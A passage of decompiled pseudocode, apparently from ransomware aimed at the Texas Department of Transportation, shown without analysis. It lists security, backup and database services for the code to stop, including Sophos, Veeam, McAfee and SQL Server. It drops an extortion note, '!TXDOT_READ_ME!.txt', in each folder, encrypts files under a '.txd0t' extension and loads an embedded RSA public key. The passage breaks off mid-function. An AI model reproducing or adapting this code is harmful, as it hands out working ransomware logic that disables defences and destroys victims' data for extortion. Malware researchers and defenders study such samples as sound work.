  v2[144] = (int)L"SmcService";
  v2[145] = (int)L"Smcinst";
  v2[146] = (int)L"SntpService";
  v2[147] = (int)L"Sophos Agent";
  v2[148] = (int)L"Sophos AutoUpdate Service";
  v2[149] = (int)L"Sophos Clean Service";
  v2[150] = (int)L"Sophos Device Control Service";
  v2[151] = (int)L"Sophos File Scanner Service";
  v2[152] = (int)L"Sophos Health Service";
  v2[153] = (int)L"Sophos MCS Agent";
  v2[154] = (int)L"Sophos MCS Client";
  v2[155] = (int)L"Sophos Message Router";
  v2[156] = (int)L"Sophos Safestore Service";
  v2[157] = (int)L"Sophos System Protection Service";
  v2[158] = (int)L"Sophos Web Control Service";
  v2[159] = (int)L"SstpSvc";
  v2[160] = (int)L"Symantec System Recovery";
  v2[161] = (int)L"TmCCSF";
  v2[162] = (int)L"TrueKey";
  v2[163] = (int)L"TrueKeyScheduler";
  v2[164] = (int)L"TrueKeyServiceHelper";
  v2[165] = (int)L"UI0Detect";
  v2[166] = (int)L"Veeam Backup Catalog Data Service";
  v2[167] = (int)L"VeeamBackupSvc";
  v2[168] = (int)L"VeeamBrokerSvc";
  v2[169] = (int)L"VeeamCatalogSvc";
  v2[170] = (int)L"VeeamCloudSvc";
  v2[171] = (int)L"VeeamDeploySvc";
  v2[172] = (int)L"VeeamDeploymentService";
  v2[173] = (int)L"VeeamEnterpriseManagerSvc";
  v2[174] = (int)L"VeeamHvIntegrationSvc";
  v2[175] = (int)L"VeeamMountSvc";
  v2[176] = (int)L"VeeamNFSSvc";
  v2[177] = (int)L"VeeamRESTSvc";
  v2[178] = (int)L"VeeamTransportSvc";
  v2[179] = (int)L"W3Svc";
  v2[180] = (int)L"WRSVC";
  v2[181] = (int)L"Zoolz 2 Service";
  v2[182] = (int)L"bedbg";
  v2[183] = (int)L"ekrn";
  v2[184] = (int)L"kavfsslp";
  v2[185] = (int)L"klnagent";
  v2[186] = (int)L"macmnsvc";
  v2[187] = (int)L"masvc";
  v2[188] = (int)L"mfefire";
  v2[189] = (int)L"mfemms";
  v2[190] = (int)L"mfevtp";
  v2[191] = (int)L"mozyprobackup";
  v2[192] = (int)L"msftesql$PROD";
  v2[193] = (int)L"ntrtscan";
  v2[194] = (int)L"sacsvr";
  v2[195] = (int)L"sophossps";
  v2[196] = (int)L"svcGenericHost";
  v2[197] = (int)L"swi_filter";
  v2[198] = (int)L"swi_service";
  v2[199] = (int)L"swi_update";
  v2[200] = (int)L"swi_update_64";
  v2[201] = (int)L"tmlisten";
  v2[202] = (int)L"wbengine";
  v2[203] = 0;
  v1 = 0;
  do
  {
    sub_402730(result);
    result = (const WCHAR *)v2[v1++];
  }
  while ( result );
  return result;
}
// 41AFE4: using guessed type wchar_t aNginx[6];
// 41BDE4: using guessed type wchar_t aAvp[4];
// 41BDEC: using guessed type wchar_t aAcrsch2svc[11];
// 41BE04: using guessed type wchar_t aAcronisVssProv[21];
// 41BE30: using guessed type wchar_t aAcronisagent[13];
// 41BE4C: using guessed type wchar_t aAcronixagent[13];
// 41BE68: using guessed type wchar_t aAntivirus[10];
// 41BE7C: using guessed type wchar_t aBackupexecagen[27];
// 41BEB4: using guessed type wchar_t aBackupexecagen_0[23];
// 41BEE4: using guessed type wchar_t aBackupexecdevi[29];
// 41BF20: using guessed type wchar_t aBackupexecjobe[20];
// 41BF48: using guessed type wchar_t aBackupexecmana[28];
// 41BF80: using guessed type wchar_t aBackupexecrpcs[21];
// 41BFAC: using guessed type wchar_t aBackupexecvssp[22];
// 41BFD8: using guessed type wchar_t aDcagent[8];
// 41BFE8: using guessed type wchar_t aDbxsvc[7];
// 41BFF8: using guessed type wchar_t aEpsecurityserv[18];
// 41C01C: using guessed type wchar_t aEpupdateservic[16];
// 41C03C: using guessed type wchar_t aEshasrv[8];
// 41C04C: using guessed type wchar_t aEhttpsrv[9];
// 41C060: using guessed type wchar_t aEnterpriseClie[26];
// 41C094: using guessed type wchar_t aErasersvc11710[15];
// 41C0B4: using guessed type wchar_t aEsgshkernel[12];
// 41C0CC: using guessed type wchar_t aFaScheduler[13];
// 41C0E8: using guessed type wchar_t aIisadmin[9];
// 41C0FC: using guessed type wchar_t aImap4svc[9];
// 41C110: using guessed type wchar_t aKavfs[6];
// 41C11C: using guessed type wchar_t aKavfsgt[8];
// 41C12C: using guessed type void *off_41C12C;
// 41C144: using guessed type void *off_41C144;
// 41C164: using guessed type wchar_t aMms[4];
// 41C16C: using guessed type wchar_t aMsexchangeab[13];
// 41C188: using guessed type wchar_t aMsexchangeadto[21];
// 41C1B4: using guessed type wchar_t aMsexchangeanti[25];
// 41C1E8: using guessed type wchar_t aMsexchangees[13];
// 41C204: using guessed type wchar_t aMsexchangeedge[19];
// 41C22C: using guessed type wchar_t aMsexchangefba[14];
// 41C248: using guessed type wchar_t aMsexchangefds[14];
// 41C264: using guessed type wchar_t aMsexchangeis[13];
// 41C280: using guessed type wchar_t aMsexchangemgmt[15];
// 41C2A0: using guessed type wchar_t aMsexchangemta[14];
// 41C2BC: using guessed type wchar_t aMsexchangemail[25];
// 41C2F0: using guessed type wchar_t aMsexchangemail_0[28];
// 41C328: using guessed type wchar_t aMsexchangemail_1[29];
// 41C364: using guessed type wchar_t aMsexchangeprot[31];
// 41C3A4: using guessed type wchar_t aMsexchangerpc[14];
// 41C3C0: using guessed type wchar_t aMsexchangerepl[15];
// 41C3E0: using guessed type wchar_t aMsexchangesa[13];
// 41C3FC: using guessed type wchar_t aMsexchangesrs[14];
// 41C418: using guessed type wchar_t aMsexchangesear[17];
// 41C43C: using guessed type wchar_t aMsexchangeserv[22];
// 41C468: using guessed type wchar_t aMsexchangethro[21];
// 41C494: using guessed type wchar_t aMsexchangetran[20];
// 41C4BC: using guessed type wchar_t aMsexchangetran_0[29];
// 41C4F8: using guessed type wchar_t aMsolapSql2008[16];
// 41C518: using guessed type wchar_t aMsolapSystemBg[18];
// 41C53C: using guessed type wchar_t aMsolapTps[11];
// 41C554: using guessed type wchar_t aMsolapTpsama[14];
// 41C570: using guessed type wchar_t aMssqlBkupexec[15];
// 41C590: using guessed type wchar_t aMssqlEcwdb2[13];
// 41C5AC: using guessed type wchar_t aMssqlPracticem[18];
// 41C5D0: using guessed type wchar_t aMssqlPracttice[19];
// 41C5F8: using guessed type wchar_t aMssqlProd[11];
// 41C610: using guessed type wchar_t aMssqlProfxenga[22];
// 41C63C: using guessed type wchar_t aMssqlSbsmonito[20];
// 41C664: using guessed type wchar_t aMssqlSharepoin[17];
// 41C688: using guessed type wchar_t aMssqlSophos[13];
// 41C6A4: using guessed type wchar_t aMssqlSqlexpres[17];
// 41C6C8: using guessed type wchar_t aMssqlSql2008[15];
// 41C6E8: using guessed type wchar_t aMssqlSystemBgc[17];
// 41C70C: using guessed type wchar_t aMssqlTps[10];
// 41C720: using guessed type wchar_t aMssqlTpsama[13];
// 41C73C: using guessed type wchar_t aMssqlVeeamsql2[21];
// 41C768: using guessed type wchar_t aMssqlVeeamsql2_0[19];
// 41C790: using guessed type wchar_t aMssqlfdlaunche[16];
// 41C7B0: using guessed type wchar_t aMssqlfdlaunche_0[32];
// 41C7F0: using guessed type wchar_t aMssqlfdlaunche_1[30];
// 41C82C: using guessed type wchar_t aMssqlfdlaunche_2[27];
// 41C864: using guessed type wchar_t aMssqlfdlaunche_3[25];
// 41C898: using guessed type wchar_t aMssqlfdlaunche_4[27];
// 41C8D0: using guessed type wchar_t aMssqlfdlaunche_5[20];
// 41C8F8: using guessed type wchar_t aMssqlfdlaunche_6[23];
// 41C928: using guessed type wchar_t aMssqlserver[12];
// 41C940: using guessed type wchar_t aMssqlserveradh[20];
// 41C968: using guessed type wchar_t aMssqlserveradh_0[23];
// 41C998: using guessed type wchar_t aMssqlserverola[23];
// 41C9C8: using guessed type wchar_t aMcafeeenginese[20];
// 41C9F0: using guessed type wchar_t aMcafeeframewor[16];
// 41CA10: using guessed type wchar_t aMcafeeframewor_0[31];
// 41CA50: using guessed type wchar_t aMcshield[9];
// 41CA64: using guessed type wchar_t aMctaskmanager[14];
// 41CA80: using guessed type wchar_t aMongodb[8];
// 41CA90: using guessed type wchar_t aMsdtsserver[12];
// 41CAA8: using guessed type wchar_t aMsdtsserver100[15];
// 41CAC8: using guessed type wchar_t aMsdtsserver110[15];
// 41CAE8: using guessed type wchar_t aMysql57[8];
// 41CAF8: using guessed type wchar_t aMysql80[8];
// 41CB08: using guessed type wchar_t aNetmsmqactivat[17];
// 41CB2C: using guessed type wchar_t aOracleclientca[20];
// 41CB54: using guessed type wchar_t aOracleservicex[16];
// 41CB74: using guessed type wchar_t aOraclexetnslis[20];
// 41CB9C: using guessed type wchar_t aPdvfsservice[13];
// 41CBB8: using guessed type wchar_t aPop3svc[8];
// 41CBC8: using guessed type wchar_t aResvc[6];
// 41CBD4: using guessed type wchar_t aReportserver[13];
// 41CBF0: using guessed type wchar_t aReportserverSq[22];
// 41CC1C: using guessed type wchar_t aReportserverSy[24];
// 41CC4C: using guessed type wchar_t aReportserverTp[17];
// 41CC70: using guessed type wchar_t aReportserverTp_0[20];
// 41CC98: using guessed type wchar_t aSavadminservic[16];
// 41CCB8: using guessed type wchar_t aSavservice[11];
// 41CCD0: using guessed type wchar_t aSdrsvc[7];
// 41CCE0: using guessed type wchar_t aSmtpsvc[8];
// 41CCF0: using guessed type wchar_t aSnac[5];
// 41CCFC: using guessed type wchar_t aSqlBackups[12];
// 41CD14: using guessed type wchar_t aSqlagentBkupex[18];
// 41CD38: using guessed type wchar_t aSqlagentCitrix[26];
// 41CD6C: using guessed type wchar_t aSqlagentCxdb[14];
// 41CD88: using guessed type wchar_t aSqlagentEcwdb2[16];
// 41CDA8: using guessed type wchar_t aSqlagentPractt[22];
// 41CDD4: using guessed type wchar_t aSqlagentPractt_0[22];
// 41CE00: using guessed type wchar_t aSqlagentProd[14];
// 41CE1C: using guessed type wchar_t aSqlagentProfxe[25];
// 41CE50: using guessed type wchar_t aSqlagentSbsmon[23];
// 41CE80: using guessed type wchar_t aSqlagentSharep[20];
// 41CEA8: using guessed type wchar_t aSqlagentSophos[16];
// 41CEC8: using guessed type wchar_t aSqlagentSqlexp[20];
// 41CEF0: using guessed type wchar_t aSqlagentSql200[18];
// 41CF14: using guessed type wchar_t aSqlagentSystem[20];
// 41CF3C: using guessed type wchar_t aSqlagentTps[13];
// 41CF58: using guessed type wchar_t aSqlagentTpsama[16];
// 41CF78: using guessed type wchar_t aSqlagentVeeams[24];
// 41CFA8: using guessed type wchar_t aSqlagentVeeams_0[22];
// 41CFD4: using guessed type wchar_t aSqlbrowser[11];
// 41CFEC: using guessed type wchar_t aSqlserveragent[15];
// 41D00C: using guessed type wchar_t aSqlsafeolrserv[18];
// 41D030: using guessed type wchar_t aSqltelemetry[13];
// 41D04C: using guessed type wchar_t aSqltelemetryEc[20];
// 41D074: using guessed type wchar_t aSqlwriter[10];
// 41D088: using guessed type wchar_t aSqlsafeBackupS[23];
// 41D0B8: using guessed type wchar_t aSqlsafeFilterS[23];
// 41D0E8: using guessed type wchar_t aSamss[6];
// 41D0F4: using guessed type wchar_t aSepmasterservi[17];
// 41D118: using guessed type wchar_t aShmonitor[10];
// 41D12C: using guessed type wchar_t aSmcservice[11];
// 41D144: using guessed type wchar_t aSmcinst[8];
// 41D154: using guessed type wchar_t aSntpservice[12];
// 41D16C: using guessed type wchar_t aSophosAgent[13];
// 41D188: using guessed type wchar_t aSophosAutoupda[26];
// 41D1BC: using guessed type wchar_t aSophosCleanSer[21];
// 41D1E8: using guessed type wchar_t aSophosDeviceCo[30];
// 41D224: using guessed type wchar_t aSophosFileScan[28];
// 41D25C: using guessed type wchar_t aSophosHealthSe[22];
// 41D288: using guessed type wchar_t aSophosMcsAgent[17];
// 41D2AC: using guessed type wchar_t aSophosMcsClien[18];
// 41D2D0: using guessed type wchar_t aSophosMessageR[22];
// 41D2FC: using guessed type wchar_t aSophosSafestor[25];
// 41D330: using guessed type wchar_t aSophosSystemPr[33];
// 41D374: using guessed type wchar_t aSophosWebContr[27];
// 41D3AC: using guessed type wchar_t aSstpsvc[8];
// 41D3BC: using guessed type wchar_t aSymantecSystem[25];
// 41D3F0: using guessed type wchar_t aTmccsf[7];
// 41D400: using guessed type wchar_t aTruekey[8];
// 41D410: using guessed type wchar_t aTruekeyschedul[17];
// 41D434: using guessed type wchar_t aTruekeyservice[21];
// 41D460: using guessed type wchar_t aUi0detect[10];
// 41D478: using guessed type wchar_t aVeeamBackupCat[34];
// 41D4BC: using guessed type wchar_t aVeeambackupsvc[15];
// 41D4DC: using guessed type wchar_t aVeeambrokersvc[15];
// 41D4FC: using guessed type wchar_t aVeeamcatalogsv[16];
// 41D51C: using guessed type wchar_t aVeeamcloudsvc[14];
// 41D538: using guessed type wchar_t aVeeamdeploysvc[15];
// 41D558: using guessed type wchar_t aVeeamdeploymen[23];
// 41D588: using guessed type wchar_t aVeeamenterpris[26];
// 41D5BC: using guessed type wchar_t aVeeamhvintegra[22];
// 41D5E8: using guessed type wchar_t aVeeammountsvc[14];
// 41D604: using guessed type wchar_t aVeeamnfssvc[12];
// 41D61C: using guessed type wchar_t aVeeamrestsvc[13];
// 41D638: using guessed type wchar_t aVeeamtransport[18];
// 41D65C: using guessed type wchar_t aW3svc[6];
// 41D668: using guessed type wchar_t aWrsvc[6];
// 41D674: using guessed type wchar_t aZoolz2Service[16];
// 41D694: using guessed type wchar_t aBedbg[6];
// 41D6A0: using guessed type wchar_t aEkrn[5];
// 41D6AC: using guessed type wchar_t aKavfsslp[9];
// 41D6C0: using guessed type wchar_t aKlnagent[9];
// 41D6D4: using guessed type wchar_t aMacmnsvc[9];
// 41D6E8: using guessed type wchar_t aMasvc[6];
// 41D6F4: using guessed type wchar_t aMfefire[8];
// 41D704: using guessed type wchar_t aMfemms[7];
// 41D714: using guessed type wchar_t aMfevtp[7];
// 41D724: using guessed type wchar_t aMozyprobackup[14];
// 41D740: using guessed type wchar_t aMsftesqlProd[14];
// 41D75C: using guessed type wchar_t aNtrtscan[9];
// 41D770: using guessed type wchar_t aSacsvr[7];
// 41D780: using guessed type wchar_t aSophossps[10];
// 41D794: using guessed type wchar_t aSvcgenerichost[15];
// 41D7B4: using guessed type wchar_t aSwiFilter[11];
// 41D7CC: using guessed type wchar_t aSwiService[12];
// 41D7E4: using guessed type wchar_t aSwiUpdate[11];
// 41D7FC: using guessed type wchar_t aSwiUpdate64[14];
// 41D818: using guessed type wchar_t aTmlisten[9];
// 41D82C: using guessed type wchar_t aWbengine[9];

//----- (00403060) --------------------------------------------------------
WCHAR *__usercall sub_403060@<eax>(WCHAR *result@<eax>)
{
  const WCHAR *v1; // esi
  WCHAR *v2; // edx
  HANDLE ProcessHeap; // eax
  WCHAR *v5; // edi
  WCHAR *FileNameW; // eax
  HANDLE FileW; // eax
  void *v8; // esi
  HANDLE v9; // eax
  SIZE_T v10; // [esp-8h] [ebp-14h]
  DWORD NumberOfBytesWritten; // [esp+4h] [ebp-8h] BYREF
  __int16 Buffer; // [esp+8h] [ebp-4h] BYREF

  v1 = result;
  if ( result )
  {
    v2 = result + 1;
    while ( *result++ )
      ;
    v10 = 2 * (result - v2) + 168;
    ProcessHeap = GetProcessHeap();
    result = (WCHAR *)HeapAlloc(ProcessHeap, 8u, v10);
    v5 = result;
    if ( result )
    {
      StrCpyW(result, v1);
      FileNameW = PathFindFileNameW(v5);
      if ( FileNameW )
      {
        StrCpyW(FileNameW, L"!TXDOT_READ_ME!.txt");
        if ( !PathFileExistsW(v5) )
        {
          FileW = CreateFileW(v5, 0x40000000u, 3u, 0, 2u, 0x80u, 0);
          v8 = FileW;
          if ( FileW != (HANDLE)-1 )
          {
            Buffer = -257;
            NumberOfBytesWritten = 0;
            if ( FileW )
            {
              if ( WriteFile(FileW, &Buffer, 2u, &NumberOfBytesWritten, 0) )
              {
                if ( NumberOfBytesWritten == 2 )
                {
                  FlushFileBuffers(v8);
                  NumberOfBytesWritten = 0;
                  if ( WriteFile(
                         v8,
                         L"Greetings, Texas Department of Transportation!\r\n"
                          "\r\n"
                          "Read this message CAREFULLY and contact someone from IT department.\r\n"
                          "Your files are securely ENCRYPTED.\r\n"
                          "No third party decryption software EXISTS.\r\n"
                          "MODIFICATION or RENAMING encrypted files may cause decryption failure.\r\n"
                          "\r\n"
                          "You can send us an encrypted file (not greater than 400KB) and we will decrypt it FOR FREE,\r\n"
                          "so you have no doubts in possibility to restore all files from all affected systems ANY TIME.\r"
                          "\n"
                          "Encrypted file SHOULD NOT contain sensitive information (technical, backups, databases, large "
                          "documents).\r\n"
                          "The rest of data will be available after the PAYMENT.\r\n"
                          "Infrastructure rebuild will cost you MUCH more.\r\n"
                          "\r\n"
                          "Contact us ONLY if you officially represent the whole affected network.\r\n"
                          "The ONLY attachments we accept are non archived encrypted files for test decryption.\r\n"
                          "Speak ENGLISH when contacting us.\r\n"
                          "\r\n"
                          "Mail us: txdot911@protonmail.com\r\n"
                          "We kindly ask you not to use GMAIL, YAHOO or LIVE to contact us.\r\n"
                          "The PRICE depends on how quickly you do it.\r\n",
                         0x7F0u,
                         &NumberOfBytesWritten,
                         0) )
                  {
                    if ( NumberOfBytesWritten == 2032 )
                      FlushFileBuffers(v8);
                  }
                }
              }
            }
            CloseHandle(v8);
          }
        }
      }
      v9 = GetProcessHeap();
      return (WCHAR *)HeapFree(v9, 0, v5);
    }
  }
  return result;
}
// 41D840: using guessed type wchar_t aGreetingsTexas[1016];

//----- (00403180) --------------------------------------------------------
void sub_403180()
{
  int *v0; // eax
  HANDLE FileW; // eax
  void *v2; // esi
  bool v3; // zf
  WCHAR pszPath[260]; // [esp+4h] [ebp-214h] BYREF
  int v5; // [esp+20Ch] [ebp-Ch]
  __int16 Buffer; // [esp+210h] [ebp-8h] BYREF
  DWORD NumberOfBytesWritten; // [esp+214h] [ebp-4h] BYREF

  v5 = 0;
  if ( dword_4246D8[0] )
  {
    v0 = dword_4246D8;
    do
    {
      if ( SHGetFolderPathW(0, *v0, 0, 0, pszPath) >= 0 )
      {
        StrCpyNW(pszPath, L"!TXDOT_READ_ME!.txt", 260);
        if ( !PathFileExistsW(pszPath) )
        {
          FileW = CreateFileW(pszPath, 0x40000000u, 3u, 0, 2u, 0x80u, 0);
          v2 = FileW;
          if ( FileW != (HANDLE)-1 )
          {
            Buffer = -257;
            NumberOfBytesWritten = 0;
            if ( FileW )
            {
              if ( WriteFile(FileW, &Buffer, 2u, &NumberOfBytesWritten, 0) )
              {
                if ( NumberOfBytesWritten == 2 )
                {
                  FlushFileBuffers(v2);
                  NumberOfBytesWritten = 0;
                  if ( WriteFile(
                         v2,
                         L"Greetings, Texas Department of Transportation!\r\n"
                          "\r\n"
                          "Read this message CAREFULLY and contact someone from IT department.\r\n"
                          "Your files are securely ENCRYPTED.\r\n"
                          "No third party decryption software EXISTS.\r\n"
                          "MODIFICATION or RENAMING encrypted files may cause decryption failure.\r\n"
                          "\r\n"
                          "You can send us an encrypted file (not greater than 400KB) and we will decrypt it FOR FREE,\r\n"
                          "so you have no doubts in possibility to restore all files from all affected systems ANY TIME.\r"
                          "\n"
                          "Encrypted file SHOULD NOT contain sensitive information (technical, backups, databases, large "
                          "documents).\r\n"
                          "The rest of data will be available after the PAYMENT.\r\n"
                          "Infrastructure rebuild will cost you MUCH more.\r\n"
                          "\r\n"
                          "Contact us ONLY if you officially represent the whole affected network.\r\n"
                          "The ONLY attachments we accept are non archived encrypted files for test decryption.\r\n"
                          "Speak ENGLISH when contacting us.\r\n"
                          "\r\n"
                          "Mail us: txdot911@protonmail.com\r\n"
                          "We kindly ask you not to use GMAIL, YAHOO or LIVE to contact us.\r\n"
                          "The PRICE depends on how quickly you do it.\r\n",
                         0x7F0u,
                         &NumberOfBytesWritten,
                         0) )
                  {
                    if ( NumberOfBytesWritten == 2032 )
                      FlushFileBuffers(v2);
                  }
                }
              }
            }
            CloseHandle(v2);
          }
        }
      }
      v3 = dword_4246D8[++v5] == 0;
      v0 = &dword_4246D8[v5];
    }
    while ( !v3 );
  }
}
// 41D840: using guessed type wchar_t aGreetingsTexas[1016];
// 4246D8: using guessed type int dword_4246D8[6];

//----- (004032A0) --------------------------------------------------------
unsigned int __cdecl sub_4032A0(unsigned int a1, unsigned int *a2, unsigned int a3)
{
  unsigned int *v3; // esi
  int i; // eax
  unsigned int result; // eax
  unsigned int *v6; // [esp-4h] [ebp-14h]

  v3 = a2;
  for ( i = 15 - (_DWORD)a2; ; i = 15 - (_DWORD)a2 )
  {
    result = (unsigned int)v3 + i;
    if ( result >= a3 )
      break;
    v6 = v3;
    v3 += 4;
    result = sub_406620(a1, v6);
    if ( result )
      break;
  }
  qword_428BF8 += a3;
  return result;
}
// 428BF8: using guessed type __int64 qword_428BF8;

//----- (004032F0) --------------------------------------------------------
int __cdecl sub_4032F0(unsigned __int16 *psz2, void *a2)
{
  const WCHAR *v2; // edi
  int v3; // ebx
  void *v4; // esp
  const WCHAR *v5; // esi
  HANDLE FileW; // ebx
  int v7; // ecx
  char *v8; // eax
  signed __int64 QuadPart; // kr00_8
  WCHAR v11[6]; // [esp+0h] [ebp-338h] BYREF
  char Buffer[512]; // [esp+Ch] [ebp-32Ch] BYREF
  _DWORD v13[70]; // [esp+20Ch] [ebp-12Ch] BYREF
  DWORD NumberOfBytesWritten; // [esp+324h] [ebp-14h] BYREF
  union _LARGE_INTEGER FileSize; // [esp+328h] [ebp-10h] BYREF
  WCHAR *v16; // [esp+330h] [ebp-8h]
  int v17; // [esp+334h] [ebp-4h]

  v2 = psz2;
  v3 = 0;
  v17 = 0;
  if ( !psz2 )
    return v3;
  v4 = alloca(2 * wcslen(psz2) + 534);
  v5 = v11;
  v16 = v11;
  if ( !v11 )
    return v3;
  StrCpyW(v11, psz2);
  StrCatW(v11, L".txd0t");
  if ( PathFileExistsW(v11) )
    return v3;
  SetFileAttributesW(psz2, 0x80u);
  FileW = CreateFileW(psz2, 0xC0000000, 0, 0, 3u, 0x8000080u, 0);
  if ( FileW != (HANDLE)-1 )
  {
    FileSize.QuadPart = 0i64;
    GetFileSizeEx(FileW, &FileSize);
    if ( FileSize.QuadPart >= 16 )
    {
      sub_413EB0((int)v13, 0, 0x118u);
      EnterCriticalSection(&stru_425F70);
      qmemcpy(Buffer, &unk_425F88, sizeof(Buffer));
      sub_4060E0(v13, (int)&unk_425F50);
      LeaveCriticalSection(&stru_425F70);
      if ( sub_404E40(2u, FileW, 0i64) )
      {
        NumberOfBytesWritten = 0;
        if ( WriteFile(FileW, Buffer, 0x200u, &NumberOfBytesWritten, 0) )
        {
          if ( NumberOfBytesWritten == 512 )
          {
            v7 = 512;
            v8 = Buffer;
            do
            {
              *v8++ = 0;
              --v7;
            }
            while ( v7 );
            QuadPart = FileSize.QuadPart;
            if ( sub_404E40(1u, FileW, (LARGE_INTEGER)(-512 - FileSize.QuadPart)) )
            {
              if ( sub_4022F0(FileW, (int)v13, a2, QuadPart, (void (__cdecl *)(int, void *, DWORD))sub_4032A0) )
              {
                sub_403060(psz2);
                ++*(_DWORD *)arglist;
                v17 = 1;
              }
            }
          }
        }
      }
      v5 = v16;
      v2 = psz2;
    }
    CloseHandle(FileW);
    v3 = v17;
    if ( v17 )
      sub_4050D0(v2, v5);
    return v3;
  }
  return v17;
}
// 4032F0: using guessed type _DWORD var_12C[70];

//----- (00403510) --------------------------------------------------------
int sub_403510()
{
  __m128i *v0; // ebx
  unsigned int v1; // edi
  unsigned int v2; // ebx
  int i; // ecx
  char *v4; // eax
  int v6; // esi
  unsigned int v7; // esi
  int v8; // eax
  HANDLE ProcessHeap; // eax
  __m128i *v11; // [esp+10h] [ebp-14F8h]
  int v12; // [esp+14h] [ebp-14F4h]
  __m128i *v13; // [esp+18h] [ebp-14F0h]
  int v14[8]; // [esp+20h] [ebp-14E8h] BYREF
  __m128i v15; // [esp+40h] [ebp-14C8h] BYREF
  __m128i v16[2]; // [esp+50h] [ebp-14B8h] BYREF
  _DWORD v17[3]; // [esp+70h] [ebp-1498h] BYREF
  char v18; // [esp+7Fh] [ebp-1489h] BYREF
  int v19; // [esp+80h] [ebp-1488h]
  int v20; // [esp+84h] [ebp-1484h]
  int v21; // [esp+88h] [ebp-1480h]
  int v22; // [esp+8Ch] [ebp-147Ch]
  _DWORD v23[72]; // [esp+90h] [ebp-1478h] BYREF
  int v24; // [esp+1B0h] [ebp-1358h] BYREF
  unsigned int v25; // [esp+1B4h] [ebp-1354h]
  _DWORD v26[3]; // [esp+1B8h] [ebp-1350h] BYREF
  int v27[36]; // [esp+1C4h] [ebp-1344h] BYREF
  int v28; // [esp+254h] [ebp-12B4h]
  int v29; // [esp+258h] [ebp-12B0h]
  char v30[48]; // [esp+260h] [ebp-12A8h] BYREF
  int v31[2]; // [esp+290h] [ebp-1278h] BYREF
  char v32[216]; // [esp+298h] [ebp-1270h] BYREF
  int v33; // [esp+370h] [ebp-1198h]
  char v34[404]; // [esp+374h] [ebp-1194h] BYREF
  __m128i v35[256]; // [esp+508h] [ebp-1000h] BYREF

  v12 = 0;
  v0 = (__m128i *)sub_405320();
  v11 = v0;
  if ( v0 )
  {
    off_423FA0 = (int (__cdecl *)(_DWORD, _DWORD))sub_404E00;
    off_423FA4 = (int (__cdecl *)(_DWORD))sub_404E20;
    sub_413EB0((int)&v24, 0, 0xACu);
    v28 = 0;
    v29 = 0;
    sub_413EB0((int)v17, 0, 0x140u);
    sub_4072C0(v31);
    v1 = strlen(v0->m128i_i8);
    memset(v14, 0, sizeof(v14));
    sub_413EB0((int)v23, 0, 0x118u);
    v23[70] = sub_4074E0;
    v23[71] = v31;
    if ( !v21 )
      v21 = 48;
    v22 = 10000;
    if ( sub_4060E0(v23, (int)v14) || sub_407060((int)v17, v1, v0) )
      goto LABEL_30;
    v2 = 32;
    v13 = v16;
    sub_413EB0((int)v30, 0, 0x30u);
    if ( v19 <= v22 && !v20 || !sub_407060((int)v17, 0, 0) )
    {
      for ( i = 16 - (_DWORD)&v18; ; i = 16 - (_DWORD)&v18 )
      {
        v4 = &v18;
        do
        {
          if ( (*v4)++ != -1 )
            break;
          --v4;
        }
        while ( (int)&v4[i] > 0 );
        v6 = sub_406620((unsigned int)v23, (unsigned int *)&v15);
        if ( v6 )
          break;
        v7 = 16;
        if ( v2 <= 0x10 )
          v7 = v2;
        sub_415930((unsigned int)v13, &v15, v7);
        v2 -= v7;
        v13 = (__m128i *)((char *)v13 + v7);
        if ( !v2 )
        {
          v6 = sub_406F60(v17, (int)v30);
          if ( !v6 )
            ++v19;
          break;
        }
      }
      sub_413EB0((int)v30, 0, 0x30u);
      sub_413EB0((int)&v15, 0, 0x10u);
      if ( !v6
        && !sub_4079B0(
              v26,
              "BB45A5C97A75102E2C0030CB9A4851D89026721CA327A27A7E0645FD427586ACF46B43DCB7719F3CD6071D559FF3C1CF6C2CAADE33"
              "B930DD60DBFDBB9CE01C3F9C6DE8303F2A780029FD71E2DC792D6A791503A9545D719F408896DEFDB05E451476D5F0E890E14D56A1"
              "C2361AD44F8E8996EA7FF09501A56FF7F8D3F5742395FAC3C77680B957C5D2006986BF6BB83F1F5519C0A9C153F7A7BC61B2749121"
              "4E33B897A626F2FD3F792088D4C34722033B95ED10487EB54CDC87F14C357F04CAADBBE48C46082AA2FEB58DB4FF58728470FD4254"
              "A7F0F163961E22D20983501C7A316710129AB4567581931C43CC7016F7FD944557D10D05E767F6DD08A66088D0BDE7C6442222F026"
              "645201791DBFD462ABDDA8B2CB650E2D487386D544FBE4805664E5A3ECC2EC4A7FD9161566D9B83185AF27F4C935A1B17F0A607E6E"
              "33BC187DA9FD968E4DF5B1D80E644E2AFA607F03115A1A42D89A4A87CC1611A6526BC2BFBDEA8F9D7F97726DBD0858D0CC9735F3F3"
              "9A50DFD80BCDD3CA5CACA0828BF4374F5DA939B130D8042BF901A10BDB51E535164A601164D440A9F8E24F4929691CCC9992A3158F"
              "D96DCE3BD9F97EF7C6EE18D98BFAC3D5C7A5DC4A4CD10698DC0A2F58A4AFD779C014669A223CFC3AC0694EBD0C4C1EB2BE7589584C"
              "2B6497B1F0DF2BEBF286AE9462BDFB0FB9321C0C0B09694A1C1AEFE6DE61D849A7E80F")
        && !sub_4079B0(v27, "010001") )
      {
        v25 = (unsigned int)(sub_407920((int)v26) + 7) >> 3;
        if ( !v28 )
        {
          v8 = sub_4059A0(v17, &v24, v16, v35);
LABEL_27:
          if ( !v8 )
          {
            EnterCriticalSection(&stru_425F70);
            qmemcpy(&unk_425F50, v16, 0x20u);
            sub_415930((unsigned int)&unk_425F88, v35, v25);
            LeaveCriticalSection(&stru_425F70);
            v12 = 1;
            sub_405B50(&v24);
            sub_413EB0((int)v23, 0, 0x118u);
            sub_413EB0((int)v17, 0, 0x140u);
            sub_413EB0((int)v32, 0, 0xD8u);
            v33 = 0;
            sub_413EB0((int)v34, 0, 0x190u);
            v31[0] = 0;
          }
          goto LABEL_29;
        }
        if ( v28 == 1 )
        {
          v8 = sub_4057F0(&v24, v17, v16, v35);
          goto LABEL_27;
        }
      }
    }
LABEL_29:
    v0 = v11;
LABEL_30:
    ProcessHeap = GetProcessHeap();
    HeapFree(ProcessHeap, 0, v0);
    return v12;
  }
  return 0;
}
// 423FA0: using guessed type int (__cdecl *off_423FA0)(_DWORD, _DWORD);
// 423FA4: using guessed type int (__cdecl *off_423FA4)(_DWORD);
// 403510: using guessed type _DWORD var_1498[3];
// 403510: using guessed type __m128i var_14B8[2];
// 403510: using guessed type _DWORD var_1350[3];
// 403510: using guessed type int var_1344[36];
// 403510: using guessed type __m128i var_1000[256];
// 403510: using guessed type char var_1270[216];
// 403510: using guessed type char var_1194[404];

//----- (00403900) --------------------------------------------------------
void __stdcall __noreturn sub_403900(PVOID Parameter)
{
